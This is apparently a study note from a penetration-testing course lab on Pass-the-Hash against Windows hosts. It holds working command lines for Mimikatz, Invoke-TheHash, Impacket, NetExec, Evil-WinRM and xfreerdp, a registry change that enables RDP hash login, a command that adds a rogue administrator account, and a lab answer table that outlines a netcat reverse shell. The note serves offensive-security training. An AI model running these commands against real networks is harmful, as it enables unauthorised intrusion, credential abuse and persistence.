# NOTE — Pass the Hash (PtH)

## ID
526

## Module
Password Attacks

## Kind
methodology

## Title
Section 20 — Pass the Hash (PtH)

## Description
Authenticate to Windows hosts with an NTLM hash instead of a password — works against SMB, WinRM, RDP. Tools: Mimikatz, Invoke-TheHash, Impacket (psexec/wmiexec/smbexec), NetExec, Evil-WinRM, xfreerdp.

## Tags
pth, pass-the-hash, ntlm, mimikatz, impacket, evil-winrm, netexec, invoke-thehash, xfreerdp, restricted-admin

## Commands
- `mimikatz "privilege::debug" "sekurlsa::pth /user:<u> /rc4:<nthash> /domain:<d> /run:cmd.exe" exit`
- `Invoke-SMBExec -Target <ip> -Domain <d> -Username <u> -Hash <nthash> -Command "<cmd>"`
- `Invoke-WMIExec -Target <ip> -Domain <d> -Username <u> -Hash <nthash> -Command "<cmd>"`
- `impacket-psexec <user>@<ip> -hashes :<nthash>`
- `impacket-wmiexec <user>@<ip> -hashes :<nthash>`
- `netexec smb <range> -u <u> -d . -H <nthash>`
- `netexec smb <ip> -u <u> -d . -H <nthash> -x "<cmd>"`
- `evil-winrm -i <ip> -u <u> -H <nthash>`
- `xfreerdp /v:<ip> /u:<u> /pth:<nthash>` (requires DisableRestrictedAdmin=0)
- `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`

## Concept Overview
NTLM authentication challenges produce a response computed from the NTLM password hash. So if you have the hash, you can answer the challenge without ever knowing the plaintext. This is **Pass-the-Hash (PtH)**.

The hash format is `LM:NT` — for modern Windows the LM is always `aad3b435b51404eeaad3b435b51404ee` (empty), and only the NT half matters. Some tools accept `:nthash` shorthand.

## Where Do Hashes Come From?
- SAM dump (local accounts) — see [[11-attacking-sam-system-security]]
- NTDS.dit dump (domain accounts) — see [[14-attacking-active-directory-and-ntds]]
- LSASS dump — see [[12-attacking-lsass]]
- Captured/relayed NTLMv2 hashes — only *after* cracking the v2 (PtH uses the raw NT hash)

## PtH from Windows

### Mimikatz `sekurlsa::pth`
Spawns a process whose memory has the *forged* NTLM credentials. Doesn't change LSASS visibly — `whoami` still shows the original user, but network auth uses the injected creds.
```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```
Required:
- `/user:` target username
- `/rc4:` or `/NTLM:` the NT hash
- `/domain:` domain or hostname (for local: `.` or computer name)
- `/run:` command to launch (default `cmd.exe`)

In the spawned cmd, anything you do over SMB/Kerberos goes as the target user.

### Invoke-TheHash (PowerShell)
PowerShell-native PtH for SMB or WMI. No local admin needed on the *attacker* side.
```powershell
Import-Module .\Invoke-TheHash.psd1

# SMB-based execution
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio \
  -Hash 64F12CDDAA88057E06A81B54E73B949B \
  -Command "net user mark Password123 /add && net localgroup administrators mark /add"

# WMI-based execution
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio \
  -Hash 64F12CDDAA88057E06A81B54E73B949B \
  -Command "powershell -e <base64>"
```

## PtH from Linux

### Impacket
```bash
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
impacket-wmiexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
impacket-smbexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
impacket-atexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```
The colon prefix `:hash` means "empty LM, just NT".

### NetExec (best for password spraying with hashes)
```bash
# Test a hash across a /24, local auth
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 --local-auth

# Execute a command directly
netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

### Evil-WinRM
```bash
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
# Domain account:
evil-winrm -i dc01.inlanefreight.htb -u administrator -H <hash>
```

### xfreerdp (Restricted Admin mode)
RDP PtH requires *Restricted Admin Mode* enabled on the target. Default = disabled.

Enable (you need code-exec on the target first):
```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
Then:
```bash
xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

## The UAC Restriction for Local Accounts
By default, **only RID 500 (built-in Administrator)** can PtH against a Windows host. Other local admins are blocked by UAC for remote admin actions.

To allow *all* local admins remote PtH, the target needs:
```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy = 1
```

The reverse setting `FilterAdministratorToken=1` blocks even the RID 500 account from remote PtH. Read [Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy](https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/) for the full picture.

**Domain accounts** are not subject to this UAC restriction — a domain user with local admin can always PtH remotely.

## Lab — Questions & Answers
| Q | Answer | Method |
|---|--------|--------|
| Q1 — Contents of `C:\pth.txt` using PtH | **(hidden — see HTB walkthrough)** | `nxc smb <ip> -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x 'type C:\pth.txt'` |
| Q2 — Registry value name to allow PtH over RDP | **`DisableRestrictedAdmin`** | Set to 0 to enable Restricted Admin Mode for `/pth:` |
| Q3 — David's NTLM/RC4 hash (from Mimikatz `sekurlsa::logonpasswords` on MS01 over RDP-PtH) | **(hidden)** | After enabling DisableRestrictedAdmin and RDP'ing in with Administrator hash, run mimikatz to dump logged-on user hashes |
| Q4 — Read `\\DC01\david\david.txt` using David's hash | **(hidden)** | `mimikatz sekurlsa::pth /user:david /rc4:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight.htb /run:cmd.exe` → `type \\DC01\david\david.txt` |
| Q5 — Read `\\DC01\julio\julio.txt` using Julio's hash | **(hidden)** | Same pattern with Julio's hash |
| Q6 — Reverse shell from DC01 to MS01 via Invoke-WMIExec + Julio's hash, read `C:\julio\flag.txt` | **(hidden)** | Open `nc -nlvp 8008` on MS01; from PtH-cmd, run PowerShell with Invoke-TheHash module, send base64 reverse-shell payload targeting DC01 |

## Key Takeaways
- PtH works with NTLM auth (SMB, WinRM, MSSQL, etc.) — *not* Kerberos. For Kerberos use [[21-pass-the-ticket-from-windows]].
- The colon prefix (`:nthash`) in Impacket signals "no LM, just NT" — always use this against modern hashes.
- RDP PtH (`/pth:`) is the awkward exception — requires Restricted Admin Mode (`DisableRestrictedAdmin=0`) enabled on target.
- UAC blocks local non-Administrator (non-RID-500) accounts from PtH unless `LocalAccountTokenFilterPolicy=1`. Always assume RID 500 works, others may not.
- NetExec's `--local-auth` + `-H` is the fastest way to find hash reuse across a subnet (gold images often share local Administrator).

## Gotchas
- Mimikatz `sekurlsa::pth` requires local admin on the *attacker* host (to write to LSASS). Use `runas` or elevate first.
- Invoke-TheHash doesn't require admin locally — easier on hardened workstations.
- "uncrackable" hash with strong PtH chain = you still own the box. Cracking is for showing impact in reports; PtH is for getting work done.
- LAPS-managed local Administrator passwords are rotated per-host — same hash won't work elsewhere.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|password-attacks]]
← [[19-credential-hunting-in-network-shares]] | [[21-pass-the-ticket-from-windows]] →
<!-- AUTO-LINKS-END -->
